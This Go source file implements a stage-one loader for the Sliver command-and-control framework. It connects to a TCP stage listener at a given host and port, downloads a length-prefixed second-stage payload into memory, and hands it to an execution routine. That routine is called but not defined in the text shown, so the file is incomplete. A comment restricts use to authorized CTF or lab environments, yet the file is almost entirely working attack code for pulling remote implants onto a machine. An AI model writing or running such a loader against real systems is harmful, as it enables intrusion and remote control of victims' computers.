// Command tcp-stager-loader fetches stage 2 from a Sliver TCP Stage Listener.
//
// The Sliver TCP stager protocol is:
//
//	[uint32 little-endian stage length][stage bytes]
//
// Run only in isolated, explicitly authorized CTF or lab environments.
package main

import (
	"encoding/binary"
	"errors"
	"flag"
	"fmt"
	"io"
	"net"
	"os"
	"time"
)

const (
	defaultTimeout = 15 * time.Second
	maxStageSize   = 64 << 20
	lengthPrefix   = 4
)

func main() {
	if err := run(); err != nil {
		fmt.Fprintf(os.Stderr, "tcp-stager-loader: %v\n", err)
		os.Exit(1)
	}
}

func run() error {
	timeout := flag.Duration("timeout", defaultTimeout, "connection and stage download timeout")
	flag.Parse()
	if flag.NArg() != 1 {
		return errors.New("usage: tcp-stager-loader [flags] HOST:PORT")
	}

	address := flag.Arg(0)
	if _, _, err := net.SplitHostPort(address); err != nil {
		return fmt.Errorf("invalid listener address %q: %w", address, err)
	}

	stage, err := fetchStage(address, *timeout)
	if err != nil {
		return err
	}
	if err := executeStage(stage); err != nil {
		return err
	}
	return nil
}

func fetchStage(address string, timeout time.Duration) ([]byte, error) {
	conn, err := net.DialTimeout("tcp", address, timeout)
	if err != nil {
		return nil, fmt.Errorf("connect to stage listener: %w", err)
	}
	if err := conn.SetDeadline(time.Now().Add(timeout)); err != nil {
		_ = conn.Close()
		return nil, fmt.Errorf("set connection deadline: %w", err)
	}
	defer conn.Close()

	var prefix [lengthPrefix]byte
	if _, err := io.ReadFull(conn, prefix[:]); err != nil {
		return nil, fmt.Errorf("read stage length: %w", err)
	}
	size := binary.LittleEndian.Uint32(prefix[:])
	if size == 0 || size > maxStageSize {
		return nil, fmt.Errorf("invalid stage size %d", size)
	}

	stage := make([]byte, int(size))
	if _, err := io.ReadFull(conn, stage); err != nil {
		return nil, fmt.Errorf("read stage payload: %w", err)
	}
	return stage, nil
}
